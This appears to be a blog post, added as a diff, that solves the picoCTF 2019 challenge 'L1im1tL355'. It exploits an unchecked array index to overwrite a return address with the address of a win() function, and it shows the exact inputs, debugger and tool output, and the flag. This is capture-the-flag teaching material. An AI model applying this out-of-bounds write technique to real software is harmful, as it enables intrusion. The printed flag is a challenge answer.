@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html lang="en-us"><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+    <meta name="generator" content="Hugo 0.80.0" />
+
+    <link rel="apple-touch-icon" sizes="180x180" href="https://shiny-labs.re/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://shiny-labs.re/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://shiny-labs.re/favicon-16x16.png">
+    <link rel="manifest" href="https://shiny-labs.re/site.webmanifest">
+    <link rel="mask-icon" href="https://shiny-labs.re/safari-pinned-tab.svg" color="#000000">
+    <meta name="msapplication-TileColor" content="#ffffff">
+    <meta name="theme-color" content="#ffffff">
+
+
+    <link rel="stylesheet" href="https://shiny-labs.re/css/bulma.min.css">
+    <link rel="stylesheet" href="https://shiny-labs.re/css/main.css">
+    <link rel="stylesheet" href="https://shiny-labs.re/css/syntax.css">
+
+    
+    <title>shiny-labs || PicoCTF 2019 - L1im1tL355</title>
+</head>
+<body><nav class="navbar" role="navigation" aria-label="main navigation">
+    <div class="navbar-brand">
+        <a class="navbar-item no-squiggly" href="https://shiny-labs.re/">
+            <h1 id="logo" class="glitch">shiny-labs</h1>
+        </a>
+    </div>
+
+    <div class="navbar-menu">
+        <div class="navbar-start">
+            
+        </div>
+
+        <div class="navbar-end">
+            
+            <h3 id="subtitle">Exploit, reverse engineering and cats.</h3>
+        </div>
+    </div>
+</nav>
+
+<div id="content">
+
+            <div class="columns is-centered">
+                <div class="column is-three-fifths" id="menu-column"><div id="menu" class="tabs is-centered is-medium">
+    <ul>
+            <li><a href="https://shiny-labs.re/" class="no-squiggly">Home</a></li>
+            <li><a href="https://shiny-labs.re/archives/" class="no-squiggly">Archives</a></li>
+            <li><a href="https://shiny-labs.re/tags/" class="no-squiggly">Tags</a></li>
+            <li><a href="https://shiny-labs.re/about/" class="no-squiggly">About</a></li>
+  </ul>
+</div>
+
+<div class="columns">
+<div class="column is-10" id="main-column">
+    <article class="article">
+        <div >
+            <h1 class="article-title">PicoCTF 2019 - L1im1tL355</h1>
+            
+<div class="post-meta">
+  <p class="article-meta">
+  <span>Date</span> &#x5b;
+  <time datetime="August 19, 2020">
+      Aug 19
+    </time>
+  &#x5d;
+        
+        
+  <span>Categories</span> &#x5b;
+    <a href="https://shiny-labs.re/categories/ctf">CTF</a>
+  &#x5d;
+        
+        
+  <span>Series</span> &#x5b;
+    <a href="https://shiny-labs.re/series/picoctf2019">picoCTF2019</a>
+  &#x5d;
+        
+        
+  <span>Tags</span> &#x5b;
+    <a href="https://shiny-labs.re/tags/exploit">exploit</a>
+  &#x5d;
+  </p>
+</div>
+
+        </div>
+        <div>
+            <h1 id="description">Description</h1>
+<blockquote>
+<p>Just pwn this program and get a flag. Its also found in /problems/l1im1tl355_4_b2111fe5737c985221bac06a80d6d6c7 on the shell server. Source.</p>
+</blockquote>
+<p>Hint: An unbounded index can point anywhere!</p>
+<h1 id="solution">Solution</h1>
+<p>Okay, what does that binary do?</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">$ ./vuln
+Input the integer value you want to put in the array
+
+1
+Input the index in which you want to put the value
+
+1
+</code></pre></div><p>Mokay, pretty straight forward, we give a value and it&rsquo;s put in array[index].</p>
+<p>Time to have a look at the source code ~~</p>
+<p>The array is defined as an array of 666 elements</p>
+<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="n">array</span><span class="p">[</span><span class="mi">666</span><span class="p">];</span>
+</code></pre></div><p>Our value and index inputs are retrieved with <code>scanf</code>:</p>
+<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c">   <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Input the integer value you want to put in the array</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+   <span class="n">scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span><span class="o">&amp;</span><span class="n">value</span><span class="p">);</span>
+   <span class="n">fgetc</span><span class="p">(</span><span class="n">stdin</span><span class="p">);</span>
+   <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Input the index in which you want to put the value</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+   <span class="n">scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span><span class="o">&amp;</span><span class="n">index</span><span class="p">);</span>
+</code></pre></div><p>Then <code>replaceIntegerInArrayAtIndex</code> will put our value in the array:</p>
+<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">replaceIntegerInArrayAtIndex</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="o">*</span><span class="n">array</span><span class="p">,</span> <span class="kt">int</span> <span class="n">index</span><span class="p">,</span> <span class="kt">int</span> <span class="n">value</span><span class="p">)</span> <span class="p">{</span>
+   <span class="n">array</span><span class="p">[</span><span class="n">index</span><span class="p">]</span> <span class="o">=</span> <span class="n">value</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div><p>A couple of interesting stuff to note so far:</p>
+<ul>
+<li>
+<p>index and value are both integers, which means -1 is a valid index value.</p>
+</li>
+<li>
+<p>There is no verification on whether index is actually in the array, providing an index of 700 will write the value outside of the array.</p>
+</li>
+<li>
+<p>=&gt; Writing outside the array is possible, we have a write-what-where primitive</p>
+</li>
+</ul>
+<p>Let&rsquo;s see if we can overwrite the return value&hellip;</p>
+<p>Using a debugger, put a breakpoint on <code>replaceIntegerInArrayAtIndex()</code>, let&rsquo;s run it with 15 (0xf) as value and 3 as index. Going <em>almost</em> instructions by instructions:</p>
+<ul>
+<li>
+<p>eax = 0xffffbbe0 =&gt; eax contains the address of the array</p>
+</li>
+<li>
+<p>ebp+0xC, storing the index (3), is multiplied by 4 (0xC) and moved to edx</p>
+</li>
+<li>
+<p>edx = address of array (stored in ebp+0x8) + index (0xC), ie edx = 0xffffbbe0 + 0xC = 0xffffbbeC</p>
+</li>
+<li>
+<p>ebp+0x10, storing the value (0xf) is moved to eax</p>
+</li>
+<li>
+<p>then that value is moved at the address stored in edx with:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback"> →  0x804865c &lt;replaceIntegerInArrayAtIndex+31&gt; mov    DWORD PTR [edx], eax
+</code></pre></div></li>
+</ul>
+<p>And after returning from replaceIntegerInArrayAtIndex, we continue our execution to:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">$esp   : 0xffffbbcc  →  0x080486fc  →  &lt;main+155&gt; add esp, 0x10
+</code></pre></div><p>If we can overwrite the return address stored at 0xffffbbcc, we can hijack the execution flow! To do so, we need:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">array + index = 0xffffbbcc
+index = 0xffffbbcc - 0xffffbbe0 = -20
+</code></pre></div><p><code>index</code> was multiplied by 4, so we need to divide by 4 to obtain our final index value: <code>-5 </code></p>
+<p>If we do a test run with:</p>
+<ul>
+<li>value: 15</li>
+<li>index: -5</li>
+</ul>
+<p>=&gt; EIP = 0xf, we control the execution flow /o/</p>
+<p>To get the flag, we need to call the <code>win</code> function:</p>
+<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">win</span><span class="p">()</span> <span class="p">{</span>
+  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="n">FLAG_BUFFER</span><span class="p">];</span>
+  <span class="n">FILE</span> <span class="o">*</span><span class="n">f</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">&#34;flag.txt&#34;</span><span class="p">,</span><span class="s">&#34;r&#34;</span><span class="p">);</span>
+  <span class="n">fgets</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="n">FLAG_BUFFER</span><span class="p">,</span><span class="n">f</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
+  <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div><p>Fortunately for us, there is no PIE:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">$ checksec vuln
+[*] &#39;/tmp/vuln&#39;
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+</code></pre></div><p>The address of <code>win</code> will always be the same and we can retrieve it with:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">$ nm vuln | grep win
+080485c6 T win
+</code></pre></div><p>Now, let&rsquo;s convert that address to decimal, as the program expects an int:</p>
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="o">&gt;&gt;&gt;</span> <span class="mh">0x080485c6</span>
+<span class="mi">134514118</span>
+</code></pre></div><p>Now for the flag, let&rsquo;s replace our previous value of 15 with the address of the win function!</p>
+<ul>
+<li>value: 134514118</li>
+<li>index: -5</li>
+</ul>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">$ ssh kylma@2019shell1.picoctf.com
+kylma@pico-2019-shell1:~$ cd /problems/l1im1tl355_4_b2111fe5737c985221bac06a80d6d6c7
+kylma@pico-2019-shell1:/problems/l1im1tl355_4_b2111fe5737c985221bac06a80d6d6c7$ ./vuln
+Input the integer value you want to put in the array
+
+134514118
+Input the index in which you want to put the value
+
+-5
+picoCTF{str1nG_CH3353_5243a217}
+Segmentation fault (core dumped)
+</code></pre></div><p>flag: <code>picoCTF{str1nG_CH3353_5243a217}</code></p>
+<p><img src="cat_ohno.gif" alt=""></p>
+
+        </div>
+    </article>
+</div>
+
+
+<div class="column" id="toc-column">    <aside>
+        <div id="toc">
+            What's on this page?
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#description">Description</a></li>
+    <li><a href="#solution">Solution</a></li>
+  </ul>
+</nav>
+        </div>
+    </aside>
+
+</div>
+
+</div></div>
+            </div><footer class="footer">
+  <div class="content has-text-centered">
+    <p>
+        <div class="copyright">
+        
+            Handcrafted with <span style="color: #e25555;">&hearts;</span> by kylma
+        
+        </div>
+
+    </p>
+  </div>
+
+  <div id="to-top">
+    <a href="#logo" class="top-btn no-squiggly">^</a>
+  </div>
+
+</footer>
+</div>
+    </body>
+</html>
